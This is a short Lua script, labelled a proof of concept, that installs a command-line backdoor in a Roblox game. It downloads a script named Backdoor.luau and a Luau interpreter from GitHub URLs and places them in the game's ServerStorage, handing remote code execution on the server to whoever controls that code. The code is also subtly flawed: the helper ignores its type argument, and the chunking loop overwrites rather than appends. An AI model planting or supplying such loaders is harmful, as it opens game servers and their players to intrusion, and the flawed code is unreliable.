--Proof of Concept: Roblox Command-Line Backdoor
local ServerStorage = game:GetService("ServerStorage")
local HttpService = game:GetService("HttpService")

local function createScript(name, type, parent, source)
    local script = Instance.new("Script")
    script.Name = name
    script.Source = source
    script.Parent = parent
    return script
end

local vLuau = createScript("vLuau", "ModuleScript", ServerStorage, HttpService:GetAsync("https://raw.githubusercontent.com/kosuke14/vLuau/refs/heads/main/init.lua"))
local _Fiu = createScript("Fiu", "ModuleScript", vLuau, HttpService:GetAsync("https://raw.githubusercontent.com/kosuke14/vLuau/refs/heads/main/Fiu.luau"))
local _Backdoor = createScript("Backdoor", "Script", vLuau, HttpService:GetAsync("https://raw.githubusercontent.com/pedrrooo/Roblox-PoC/refs/heads/main/CL-Backdoor/Backdoor.luau"))

local CeptionString = HttpService:GetAsync("https://raw.githubusercontent.com/kosuke14/vLuau/refs/heads/main/Ception.luau") -- this is because the source code is too long to fit in one line
local Ception = createScript("Ception", "ModuleScript", vLuau, "")

num = 1
for i = 1, 17 do
    Ception.Source = CeptionString:sub(num, num + 199998)
    num = num + 199998
end
Ception.Source = CeptionString:sub(num, #CeptionString)
